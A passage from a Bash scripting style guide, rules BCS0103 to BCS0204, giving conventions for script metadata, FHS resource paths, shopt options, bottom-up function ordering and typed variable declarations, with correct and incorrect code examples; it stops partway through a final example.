First lines require: shebang, optional shellcheck directives, brief description, then `set -euo pipefail`.

```bash
#!/bin/bash
#shellcheck disable=SC1090,SC1091
# Get directory sizes and report usage statistics
set -euo pipefail
```

**Allowable shebangs:**
1. `#!/bin/bash` - Most portable for Linux
2. `#!/usr/bin/bash` - BSD systems
3. `#!/usr/bin/env bash` - Maximum portability (searches PATH)

**Rationale:** `set -euo pipefail` must be first command to enable strict error handling before any other commands execute.


---


**Rule: BCS0103**

## Script Metadata

**Every script must declare standard metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) immediately after `shopt` settings and before any other code. Declare them as readonly using `declare -r`.**

**Rationale:**
- `realpath` provides canonical absolute paths and fails early if script doesn't exist
- VERSION enables deployment tracking and `--version` output
- SCRIPT_DIR enables reliable loading of companion files and resources
- SCRIPT_NAME provides consistent identification in logs and errors
- Readonly prevents accidental modification; standard names reduce cognitive load

**Standard metadata pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata - immediately after shopt
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Rest of script follows
```

**Metadata variables:**

| Variable | Purpose | Derivation |
|----------|---------|------------|
| VERSION | Semantic version (Major.Minor.Patch) | Manual assignment |
| SCRIPT_PATH | Absolute canonical path | `realpath -- "$0"` |
| SCRIPT_DIR | Directory containing script | `${SCRIPT_PATH%/*}` |
| SCRIPT_NAME | Filename only, no path | `${SCRIPT_PATH##*/}` |

**Using metadata for resource location:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Load libraries relative to script location
source "$SCRIPT_DIR"/lib/logging.sh

# Load configuration
declare -- config_file="$SCRIPT_DIR"/../etc/app.conf
[[ ! -f "$config_file" ]] || source "$config_file"

# Use metadata in logging
info "Starting $SCRIPT_NAME $VERSION"
debug "Script location: ${SCRIPT_PATH@Q}"
```

**Why realpath over readlink:**
- Simpler syntax: No `-e` and `-n` flags needed (defaults are correct)
- Loadable builtin available for maximum performance
- POSIX compliant (readlink is GNU-specific)
- Fails if file doesn't exist (catches errors early - intentional)

```bash
# ✓ Correct - use realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✓ Acceptable - readlink requires -en flags (more complex, GNU-specific)
SCRIPT_PATH=$(readlink -en -- "$0")

# For maximum performance, load realpath as builtin:
# enable -f /usr/local/lib/bash-builtins/realpath.so realpath
```

**About shellcheck SC2155:**

SC2155 warns about command substitution in `declare -r` masking return values. We disable it because:
1. realpath failure is acceptable - script should fail early if file doesn't exist
2. Metadata is set exactly once at startup
3. Concise pattern immediately makes variable readonly

**Anti-patterns:**

```bash
# ✗ Wrong - using $0 directly without realpath
SCRIPT_PATH="$0"  # Could be relative path or symlink!

# ✗ Wrong - using dirname/basename (external commands)
SCRIPT_DIR=$(dirname "$0")
SCRIPT_NAME=$(basename "$0")

# ✓ Correct - parameter expansion (faster, more reliable)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - using PWD for script directory
SCRIPT_DIR=$PWD  # This is current working directory, not script location!

# ✗ Wrong - making readonly individually causes assignment errors
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}  # Can't assign to readonly variable!

# ✓ Correct - declare as readonly immediately
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - inconsistent variable names
SCRIPT_VERSION=1.0.0  # Should be VERSION
SCRIPT_DIRECTORY=$SCRIPT_DIR  # Redundant

# ✗ Wrong - declaring metadata late in script
# ... 50 lines of code ...
VERSION=1.0.0  # Too late! Should be near top
```

**Edge case: Script in root directory**

```bash
# If script is /myscript (in root directory)
SCRIPT_PATH=/myscript
SCRIPT_DIR=${SCRIPT_PATH%/*}  # Results in empty string!

# Solution: Handle this edge case if script might be in /
SCRIPT_DIR=${SCRIPT_PATH%/*}
[[ -n "$SCRIPT_DIR" ]] || SCRIPT_DIR='/'
readonly -- SCRIPT_DIR
```

**Edge case: Sourced vs executed**

```bash
# When script is sourced, $0 is the calling shell, not the script
if [[ "${BASH_SOURCE[0]}" != "$0" ]]; then
  # Script is being sourced
  declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
else
  # Script is being executed
  declare -r SCRIPT_PATH=$(realpath -- "$0")
fi

declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- LOG_FILE="$SCRIPT_DIR"/../logs/"$SCRIPT_NAME".log
declare -- CONFIG_FILE="$SCRIPT_DIR"/../etc/"$SCRIPT_NAME".conf

info() { echo "[$SCRIPT_NAME] $*" | tee -a "$LOG_FILE"; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
show_version() { echo "$SCRIPT_NAME $VERSION"; }

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process data

Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -h, --help     Show this help message
  -V, --version  Show version information
HELP
}

load_config() {
  if [[ -f "$CONFIG_FILE" ]]; then
    info "Loading configuration from ${CONFIG_FILE@Q}"
    source "$CONFIG_FILE"
  else
    die 2 "Configuration file not found ${CONFIG_FILE@Q}"
  fi
}

main() {
  info "Starting $SCRIPT_NAME $VERSION"
  load_config
  info 'Processing complete'
}

main "$@"
#fin
```

**Key principles:**
- Declare metadata immediately after `shopt` settings
- Use standard names: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- Use `realpath` for canonical path resolution
- Derive SCRIPT_DIR/SCRIPT_NAME via parameter expansion
- Make readonly with `declare -r` at declaration time
- Handle edge cases: root directory, sourced scripts


---


**Rule: BCS0104**

## Filesystem Hierarchy Standard (FHS) Preference

**Follow FHS when designing scripts that install files or search for resources. FHS compliance enables predictable file locations, supports multi-environment installations, and integrates with package managers.**

**Rationale:**
- Predictability: Users/package managers expect files in standard locations
- Multi-environment support: Works in development, local, system, and user installs
- No hardcoded paths: FHS search patterns eliminate brittle absolute paths
- Portability: Works across distributions without modification

**Common FHS locations:**
- `/usr/local/bin/`, `/usr/bin/` - Executables (user-installed vs package-managed)
- `/usr/local/share/`, `/usr/share/` - Architecture-independent data
- `/usr/local/lib/`, `/usr/lib/` - Libraries and loadable modules
- `/usr/local/etc/`, `/etc/` - Configuration files
- `$HOME/.local/bin/`, `$HOME/.local/share/` - User-specific executables/data
- `${XDG_CONFIG_HOME:-$HOME/.config}/` - User-specific configuration

**Core FHS search pattern:**
```bash
find_data_file() {
  local -- filename=$1
  local -a search_paths=(
    "$SCRIPT_DIR"/"$filename"                                    # Development
    /usr/local/share/myapp/"$filename"                           # Local install
    /usr/share/myapp/"$filename"                                 # System install
    "${XDG_DATA_HOME:-"$HOME"/.local/share}"/myapp/"$filename"   # User install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; } ||:
  done
  return 1
}
```

**Config file search (XDG priority):**
```bash
find_config_file() {
  local -- filename=$1
  local -a search_paths=(
    "${XDG_CONFIG_HOME:-"$HOME"/.config}"/myapp/"$filename"  # User config (highest)
    /usr/local/etc/myapp/"$filename"                          # System-local
    /etc/myapp/"$filename"                                    # System-wide
    "$SCRIPT_DIR"/"$filename"                                 # Development/fallback
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ ! -f "$path" ]] || { echo "$path"; return 0; }
  done
  return 1  # Config is optional
}
```

**Library loading pattern:**
```bash
load_library() {
  local -- lib_name=$1
  local -a search_paths=(
    "$SCRIPT_DIR"/lib/"$lib_name"      # Development
    /usr/local/lib/myapp/"$lib_name"   # Local install
    /usr/lib/myapp/"$lib_name"         # System install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { source "$path"; return 0; } ||:
  done
  die 2 "Library not found ${lib_name@Q}"
}
```

**FHS-compliant installation script:**
```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Installation paths (customizable via PREFIX)
declare -- PREFIX=${PREFIX:-/usr/local}
declare -- BIN_DIR="$PREFIX"/bin
declare -- SHARE_DIR="$PREFIX"/share/myapp
declare -- LIB_DIR="$PREFIX"/lib/myapp
declare -- ETC_DIR="$PREFIX"/etc/myapp
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR

install_files() {
  install -d "$BIN_DIR" "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR"
  install -m 755 "$SCRIPT_DIR"/myapp "$BIN_DIR"/myapp
  install -m 644 "$SCRIPT_DIR"/data/template.txt "$SHARE_DIR"/template.txt
  install -m 644 "$SCRIPT_DIR"/lib/common.sh "$LIB_DIR"/common.sh
  # Preserve existing config
  [[ -f "$ETC_DIR"/myapp.conf ]] || \
    install -m 644 "$SCRIPT_DIR"/myapp.conf.example "$ETC_DIR"/myapp.conf
}

uninstall_files() {
  rm -f "$BIN_DIR"/myapp "$SHARE_DIR"/template.txt "$LIB_DIR"/common.sh
  rmdir --ignore-fail-on-non-empty "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR"
}

main() {
  case "${1:-install}" in
    install)   install_files ;;
    uninstall) uninstall_files ;;
    *)         die 2 "Usage: $SCRIPT_NAME {install|uninstall}" ;;
  esac
}
main "$@"
#fin
```

**Generic resource finder (file or directory):**
```bash
find_resource() {
  local -- type=$1 name=$2
  local -- install_base="${SCRIPT_DIR%/bin}"/share/myorg/myproject
  local -a search_paths=(
    "$SCRIPT_DIR"                     # Development
    "$install_base"                   # Custom PREFIX
    /usr/local/share/myorg/myproject  # Local install
    /usr/share/myorg/myproject        # System install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    local -- resource="$path/$name"
    case "$type" in
      file) [[ -f "$resource" ]] && { echo "$resource"; return 0; } ||: ;;
      dir)  [[ -d "$resource" ]] && { echo "$resource"; return 0; } ||: ;;
    esac
  done
  return 1
}

# Usage:
CONFIG=$(find_resource file config.yml) || die 'Config not found'
DATA_DIR=$(find_resource dir data) || die 'Data directory not found'
```

**XDG Base Directory variables:**
```bash
declare -- XDG_DATA_HOME=${XDG_DATA_HOME:-"$HOME"/.local/share}
declare -- XDG_CONFIG_HOME=${XDG_CONFIG_HOME:-"$HOME"/.config}
declare -- XDG_CACHE_HOME=${XDG_CACHE_HOME:-"$HOME"/.cache}
declare -- XDG_STATE_HOME=${XDG_STATE_HOME:-"$HOME"/.local/state}
```

**Anti-patterns:**
```bash
# ✗ Hardcoded absolute path
data_file=/home/user/projects/myapp/data/template.txt
# ✓ FHS search pattern
data_file=$(find_data_file template.txt)

# ✗ Assuming specific install location
source /usr/local/lib/myapp/common.sh
# ✓ Search multiple FHS locations
load_library common.sh

# ✗ Relative paths from CWD (breaks when run elsewhere)
source ../lib/common.sh
# ✓ Paths relative to script location
source "$SCRIPT_DIR"/../lib/common.sh

# ✗ Not supporting PREFIX customization
BIN_DIR=/usr/local/bin
# ✓ Respect PREFIX environment variable
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin

# ✗ Overwriting user config on upgrade
install myapp.conf "$PREFIX"/etc/myapp/myapp.conf
# ✓ Preserve existing config
[[ -f "$PREFIX"/etc/myapp/myapp.conf ]] || \
  install myapp.conf.example "$PREFIX"/etc/myapp/myapp.conf
```

**Edge cases:**

**1. PREFIX with trailing slash:**
```bash
PREFIX=${PREFIX:-/usr/local}
PREFIX=${PREFIX%/}  # Remove trailing slash if present
```

**2. User install without sudo:**
```bash
if [[ ! -w "$PREFIX" ]]; then
  warn "No write permission to ${PREFIX@Q}"
  info "Try: PREFIX=\$HOME/.local make install"
  die 5 'Permission denied'
fi
```

**3. Symlink resolution:**
```bash
# realpath resolves symlinks to actual installation directory
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
# SCRIPT_DIR points to actual location, not symlink (/usr/local/bin)
```

**When NOT to use FHS:**
- Single-user scripts only used by one person
- Project-specific tools (build scripts, test runners) staying in project directory
- Container applications using `/app` or similar
- Embedded systems with custom layouts

**Key principle:** FHS compliance makes scripts portable, predictable, and package-manager compatible. Design scripts to work in development mode and multiple install scenarios without modification.


---


**Rule: BCS0105**

## shopt

**Recommended settings:**

```bash
shopt -s inherit_errexit  # Critical: makes set -e work in subshells
shopt -s shift_verbose    # Catches shift errors when no arguments remain
shopt -s extglob          # Enables extended glob patterns like !(*.txt)

# CHOOSE ONE:
shopt -s nullglob   # For arrays/loops: unmatched globs �' empty
shopt -s failglob   # For strict scripts: unmatched globs �' error

# OPTIONAL:
shopt -s globstar   # Enable ** for recursive matching (slow on deep trees)
```

**Rationale:**

**`inherit_errexit` (CRITICAL):** Without it, `set -e` does NOT apply inside command substitutions:
```bash
set -e  # Without inherit_errexit
result=$(false)  # This does NOT exit the script!
echo "Still running"  # This executes

# With inherit_errexit
shopt -s inherit_errexit
result=$(false)  # Script exits here as expected
```

**`shift_verbose`:** Prints error when shift fails instead of silent continue:
```bash
shopt -s shift_verbose
shift  # If no arguments: "bash: shift: shift count must be <= $#"
```

**`extglob`:** Enables `?(pat)`, `*(pat)`, `+(pat)`, `@(pat)`, `!(pat)`:
```bash
shopt -s extglob
rm !(*.txt)                          # Delete everything EXCEPT .txt
cp *.@(jpg|png|gif) /destination/    # Multiple extensions
[[ $input == +([0-9]) ]] && echo 'Number'
```

**`nullglob` vs `failglob`:**

`nullglob` - unmatched glob expands to empty (for loops/arrays):
```bash
shopt -s nullglob
for file in *.txt; do  # No .txt files �' loop never executes
  echo "$file"
done
files=(*.log)  # No .log files �' files=() (empty array)
```

`failglob` - unmatched glob causes error (strict scripts):
```bash
shopt -s failglob
cat *.conf  # No .conf files: "bash: no match: *.conf" (exits with set -e)
```

**Anti-pattern - default behavior without nullglob/failglob:**
```bash
# ✗ Dangerous default behavior
for file in *.txt; do  # No .txt files �' $file = literal "*.txt"
  rm "$file"  # Tries to delete file named "*.txt"!
done
```

**`globstar`:** Enables `**` for recursive matching:
```bash
shopt -s globstar
for script in **/*.sh; do
  shellcheck "$script"
done
```

**Typical configuration:**
```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

**When NOT to use:**
- Interactive scripts (may want lenient behavior)
- Legacy compatibility (older bash versions)
- Performance-critical loops (`globstar` slow on large trees)


---


**Rule: BCS0106**

## File Extensions

- **Executables**: Use `.sh` extension or no extension
- **Libraries**: Must have `.sh` extension; should not be executable
- **Dual-purpose scripts**: Can use `.sh` or no extension
- **PATH-available executables**: Always omit extension


---


**Rule: BCS0107**

## Function Organization

**Always organize functions bottom-up: lowest-level primitives first, ending with `main()` as the highest-level orchestrator.**

**Rationale:**
- **No Forward References**: Bash reads top-to-bottom; defining functions in dependency order ensures called functions exist before use
- **Readability**: Readers understand primitives first, then see how they're composed
- **Maintainability**: Clear dependency hierarchy makes it obvious where to add new functions
- **Testability**: Low-level functions can be tested independently before higher-level compositions

**Standard 7-layer organization pattern:**

```bash
#!/bin/bash
set -euo pipefail

# 1. Messaging functions (lowest level - used by everything)
_msg() { ... }
success() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
yn() { ... }

# 2. Helper/utility functions (used by validation and business logic)
noarg() { ... }

# 3. Documentation functions (no dependencies)
show_help() { ... }

# 4. Validation functions (check prerequisites, dependencies)
check_root() { ... }
check_prerequisites() { ... }

# 5. Business logic functions (domain-specific operations)
build_standalone() { ... }
install_standalone() { ... }

# 6. Orchestration/flow functions
show_completion_message() { ... }
uninstall_files() { ... }

# 7. Main function (highest level - orchestrates everything)
main() {
  check_root
  check_prerequisites
  if ((UNINSTALL)); then
    uninstall_files
    return 0
  fi
  build_standalone
  install_standalone
  show_completion_message
}

main "$@"
#fin
```

**Dependency flow principle:**

```
Top of file
     ↓
[Layer 1: Messaging] ← Can call nothing (primitives)
     ↓
[Layer 2: Documentation] ← Can call Layer 1
     ↓
[Layer 3: Utilities] ← Can call Layers 1-2
     ↓
[Layer 4: Validation] ← Can call Layers 1-3
     ↓
[Layer 5: Business Logic] ← Can call Layers 1-4
     ↓
[Layer 6: Orchestration] ← Can call Layers 1-5
     ↓
[Layer 7: main()] ← Can call all layers
     ↓
main "$@" invocation
#fin
```

**Layer descriptions:**

| Layer | Functions | Purpose | Dependencies |
|-------|-----------|---------|--------------|
| 1 | `_msg()`, `info()`, `warn()`, `error()`, `die()`, `success()` | Output messages | None |
| 2 | `show_help()`, `show_version()` | Display help/usage | May use messaging |
| 3 | `yn()`, `noarg()`, `trim()` | Generic utilities | May use messaging |
| 4 | `check_root()`, `check_prerequisites()`, `validate_input()` | Verify preconditions | Utilities, messaging |
| 5 | `build_project()`, `process_file()`, `deploy_app()` | Core functionality | All lower layers |
| 6 | `run_build_phase()`, `run_deploy_phase()`, `cleanup()` | Coordinate business logic | Business logic, validation |
| 7 | `main()` | Top-level script flow | Can call any function |

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - main() at the top (forward references required)
main() {
  build_project  # build_project not defined yet!
  deploy_app     # deploy_app not defined yet!
}
build_project() { ... }
deploy_app() { ... }

# ✓ Correct - main() at bottom
build_project() { ... }
deploy_app() { ... }
main() {
  build_project
  deploy_app
}

# ✗ Wrong - business logic before utilities it calls
process_file() {
  validate_input "$1"  # validate_input not defined yet!
}
validate_input() { ... }

# ✓ Correct - utilities before business logic
validate_input() { ... }
process_file() {
  validate_input "$1"
}

# ✗ Wrong - messaging functions scattered throughout
info() { ... }
build() { ... }
warn() { ... }
deploy() { ... }
error() { ... }

# ✓ Correct - all messaging together at top
info() { ... }
warn() { ... }
error() { ... }
die() { ... }
build() { ... }
deploy() { ... }

# ✗ Wrong - circular dependencies (A calls B, B calls A)
function_a() { function_b; }
function_b() { function_a; }  # Circular dependency!

# ✓ Correct - extract common logic to lower-level function
common_logic() { ... }
function_a() { common_logic; }
function_b() { common_logic; }
```

**Within-layer ordering guidelines:**

| Layer | Ordering Strategy |
|-------|-------------------|
| 1 (Messaging) | By severity: `_msg()` �' `info()` �' `success()` �' `warn()` �' `error()` �' `die()` |
| 3 (Helpers) | Alphabetically or by frequency of use |
| 4 (Validation) | By execution sequence |
| 5 (Business Logic) | By logical workflow sequence |

**Edge cases:**

**1. Circular dependencies:**
```bash
# Extract common logic to lower layer
shared_validation() { ... }
function_a() { shared_validation; ... }
function_b() { shared_validation; ... }
```

**2. Sourced libraries:**
```bash
# Place source statements after messaging layer
info() { ... }
warn() { ... }
error() { ... }
die() { ... }

source "$SCRIPT_DIR"/lib/common.sh  # May define additional utilities

validate_email() { ... }  # Can now use both messaging AND library functions
```

**3. Private functions:**
```bash
# Functions prefixed with _ are private/internal
# Place in same layer as public functions that use them
_msg() { ... }  # Private core utility
info() { >&2 _msg "$@"; }  # Public wrapper
```

**Key principle:** Bottom-up organization mirrors how programmers think: understand primitives first, then compositions. This pattern eliminates forward reference issues and makes scripts immediately understandable.


---


**Rule: BCS0200**

# Variable Declarations & Constants

Explicit variable declaration with type hints for clarity and safety. Covers type-specific declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`), scoping (global vs local), naming conventions (UPPER_CASE constants, lower_case variables), readonly patterns for constants, boolean flag implementations using integers, and derived variable patterns. Ensures predictable behavior and prevents common shell scripting errors.


---


**Rule: BCS0201**

## Type-Specific Declarations

**Always use explicit type declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`) to make variable intent clear and enable type-safe operations.**

**Rationale:**
- **Type Safety**: Integer declarations (`-i`) enforce numeric operations; non-numeric becomes 0
- **Intent Documentation**: Types serve as inline documentation for variable usage
- **Array Safety**: Prevents accidental scalar assignment breaking array operations
- **Scope Control**: `declare`/`local` provide precise variable scoping
- **Error Prevention**: Type mismatches caught early rather than causing subtle bugs

### Declaration Types

**1. Integer variables (`declare -i`)**

```bash
declare -i count=0
declare -i exit_code=1
declare -i port=8080

# Automatic arithmetic evaluation
count=count+1  # Same as: ((count+=1))
count='5 + 3'  # Evaluates to 8, not string "5 + 3"
count='abc'    # Evaluates to 0 (non-numeric becomes 0)
```

Use for: counters, loop indices, exit codes, port numbers, any arithmetic operations.

> **See Also:** BCS0705 for using declared integers in arithmetic comparisons with `(())` instead of `[[ ... -eq ... ]]`

**2. String variables (`declare --`, `local --`)**

```bash
declare -- filename=data.txt
declare -- user_input=''
declare -- config_path=/etc/app/config.conf

# `--` prevents option injection if variable name starts with -
declare -- var_name='-weird'  # Without --, interpreted as option
```

Use for: file paths, user input, configuration values, any text data.

**3. Indexed arrays (`declare -a`)**

```bash
declare -a files=()
declare -a args=(one two three)

files+=('file1.txt')
echo "${files[0]}"   # file1.txt
echo "${files[@]}"   # All elements
echo "${#files[@]}"  # Count

for file in "${files[@]}"; do
  process "$file"
done
```

Use for: lists of items, command arrays, any sequential collection.

**4. Associative arrays (`declare -A`)**

```bash
declare -A config=(
  [app_name]=myapp
  [app_port]=8080
  [app_host]=localhost
)

user_data[name]=Alice
echo "${config[app_name]}"  # myapp
echo "${!config[@]}"        # All keys

# Check if key exists
if [[ -v "config[app_port]" ]]; then
  echo "Port: ${config[app_port]}"
fi

for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done
```

Use for: configuration data, dynamic function dispatch, caching, key-value data.

**5. Read-only constants (`declare -r`)**

```bash
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_RETRIES=3
declare -ar ALLOWED_ACTIONS=(start stop restart status)

SCRIPT_VERSION=2.0.0  # bash: VERSION: readonly variable
```

Use for: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME, configuration constants.

**6. Local variables in functions (`local --`)**

**MANDATORY: Always use `--` separator with `local` declarations.**

```bash
# ✓ CORRECT - always use `--` separator
process_file() {
  local -- filename=$1
  local -i line_count
  local -a lines

  line_count=$(wc -l < "$filename")
  readarray -t lines < "$filename"
}

# ✗ WRONG - missing `--` separator
process_file_bad() {
  local filename=$1    # If $1 is "-n", behavior changes!
  local name value     # Should be: local -- name value
}
```

Use `local` for ALL function parameters and temporary variables.

**Combining type and scope:**

```bash
declare -i GLOBAL_COUNT=0

function count_files() {
  local -- dir=$1
  local -i file_count=0
  local -a files

  files=("$dir"/*)
  for file in "${files[@]}"; do
    [[ -f "$file" ]] && file_count+=1 ||:
  done
  echo "$file_count"
}

declare -a PROCESSED_FILES=()
declare -A FILE_STATUS=()
readonly -- CONFIG_FILE=config.conf
```

### Anti-patterns

```bash
# ✗ No type declaration (intent unclear)
count=0
files=()

# ✓ Explicit type declarations
declare -i count=0
declare -a files=()

# ✗ Using strings for numeric operations
max_retries='3'
attempts='0'
if [[ "$attempts" -lt "$max_retries" ]]; then  # String comparison!

# ✓ Use integers for numeric operations
declare -i max_retries=3
declare -i attempts=0
if ((attempts < max_retries)); then  # Numeric comparison

# ✗ Forgetting -A for associative arrays
declare CONFIG  # Creates scalar, not associative array
CONFIG[key]='value'  # Treats 'key' as 0, creates indexed array!

# ✓ Explicit associative array declaration
declare -A CONFIG=()
CONFIG[key]='value'

# ✗ Global variables in functions
process_data() {
  temp_var=$1  # Global variable leak!
}

# ✓ Local variables in functions
process_data() {
  local -- temp_var=$1
  local -- result
  result=$(process "$temp_var")
}

# ✗ Scalar assignment to array variable
declare -a files=()
files=file.txt  # Overwrites array with scalar!

# ✓ Array assignment
files=(file.txt)   # Array with one element
files+=(file.txt)  # Append to array
```

### Edge Cases

**1. Integer overflow:**

```bash
declare -i big_number=9223372036854775807  # Max 64-bit signed int
big_number+=1
echo "$big_number"  # Wraps to negative!

# For very large numbers, use string or bc
declare -- big='99999999999999999999'
result=$(bc <<< "$big + 1")
```

**2. Associative array requires Bash 4.0+:**

```bash
if ((BASH_VERSINFO[0] < 4)); then
  die 1 'Associative arrays require Bash 4.0+'
fi
```

**3. Array assignment syntax:**

```bash
declare -a arr1=()           # Empty array
declare -a arr2=('a' 'b')    # Array with 2 elements
declare -a arr3              # Declare without initialization
declare -a arr4='string'     # arr4 is string, NOT array!
declare -a arr5=('string')   # Array with one element
```

**4. Nameref variables (Bash 4.3+):**

```bash
modify_array() {
  local -n arr_ref=$1  # Nameref to array
  arr_ref+=('new element')
}

declare -a my_array=('a' 'b')
modify_array my_array  # Pass name, not value
echo "${my_array[@]}"  # Output: a b new element
```

### Summary

| Type | Declaration | Use Case |
|------|-------------|----------|
| Integer | `declare -i` | counters, exit codes, ports |
| String | `declare --` | paths, text, user input |
| Indexed array | `declare -a` | lists, sequences |
| Associative array | `declare -A` | key-value maps, configs |
| Constant | `declare -r` | immutable values |
| Local | `local --` | ALL function variables |

Combine modifiers: `local -i`, `local -a`, `readonly -A`. Always use `--` separator to prevent option injection.


---


**Rule: BCS0202**

## Variable Scoping

Declare function-specific variables as `local` to prevent namespace pollution and side effects.

```bash
# Global variables - declare at top
declare -i VERBOSE=1 PROMPT=1

# Function variables - always use local
main() {
  local -a add_specs=()      # Local array
  local -i max_depth=3       # Local integer
  local -- path              # Local string
  local -- dir
  dir=$(dirname -- "$name")
}
```

**Rationale:** Without `local`, function variables: overwrite globals with same name, persist after return, break recursive calls.

**Anti-patterns:**
```bash
# ✗ Wrong - no local declaration
process_file() {
  file=$1  # Overwrites any global $file variable!
}

# ✓ Correct - local declaration
process_file() {
  local -- file=$1  # Scoped to this function only
}
```

**Recursive function gotcha:**
```bash
# ✗ Wrong - global resets on each recursive call
count_files() {
  total=0
  for file in "$1"/*; do total+=1; done
  echo "$total"
}

# ✓ Correct - each invocation gets its own total
count_files() {
  local -i total=0
  for file in "$1"/*; do total+=1; done
  echo "$total"
}
```


---


**Rule: BCS0203**

## Naming Conventions

| Type | Convention | Example |
|------|------------|---------|
| Constants | UPPER_CASE | `readonly MAX_RETRIES=3` |
| Global variables | UPPER_CASE or CamelCase | `VERBOSE=1` or `ConfigFile='/etc/app.conf'` |
| Local variables | lower_case with underscores | `local file_count=0` |
|  | CamelCase acceptable for important locals | `local ConfigData` |
| Internal/private functions | prefix with _ | `_validate_input()` |
| Environment variables | UPPER_CASE with underscores | `export DATABASE_URL` |

**Examples:**
```bash
# Constants
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_CONNECTIONS=100

# Global variables
declare -i VERBOSE=1
declare -- ConfigFile=/etc/myapp.conf

# Local variables
process_data() {
  local -i line_count=0
  local -- temp_file
  local -- CurrentSection  # CamelCase for important variable
}

# Private functions
_internal_helper() {
  # Used only by other functions in this script
}
```

**Rationale:**
- UPPER_CASE for globals/constants: Visible as script-wide scope, matches shell conventions
- lower_case for locals: Distinguishes from globals, prevents accidental shadowing
- Underscore prefix for private functions: Signals internal use, prevents namespace conflicts
- Avoid lowercase single-letter names: Reserved for shell (`a`, `b`, `n`, etc.)
- Avoid all-caps shell variables: Don't use `PATH`, `HOME`, `USER` as variable names


---


**Rule: BCS0204**

## Constants and Environment Variables

**Constants (readonly):**
```bash
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_RETRIES=3
declare -r CONFIG_DIR=/etc/myapp

# Group readonly declarations
VERSION=1.0.0
AUTHOR='John Doe'
readonly -- VERSION AUTHOR LICENSE
```

**Environment variables (export):**
```bash
declare -x ORACLE_SID=PROD
declare -x DATABASE_URL='postgresql://localhost/mydb'
export LOG_LEVEL=DEBUG
```

**When to use:**
- `readonly`: Script metadata, config paths, derived constants - prevents accidental modification
- `declare -x`/`export`: Values for child processes, environment config, subshell inheritance

| Feature | `readonly` | `declare -x` / `export` |
|---------|-----------|------------------------|
| Prevents modification | ✓ Yes | ✗ No |
| Available in subprocesses | ✗ No | ✓ Yes |
| Can be changed later | ✗ Never | ✓ Yes |

**Combining both (readonly + export):**
```bash
declare -rx BUILD_ENV=production
declare -rix MAX_CONNECTIONS=100
```

**Anti-patterns:**
```bash
# ✗ Exporting internal constants - child processes don't need this
export MAX_RETRIES=3
# ✓ Correct
readonly -- MAX_RETRIES=3

# ✗ Not protecting true constants
CONFIG_FILE=/etc/app.conf
# ✓ Correct
readonly -- CONFIG_FILE=/etc/app.conf

# ✗ Making user-configurable variables readonly too early
readonly -- OUTPUT_DIR="$HOME"/output  # Can't be overridden!
# ✓ Allow override first
OUTPUT_DIR=${OUTPUT_DIR:-"$HOME"/output}
readonly -- OUTPUT_DIR
```

**Complete example:**
```bash
#!/usr/bin/env bash
set -euo pipefail

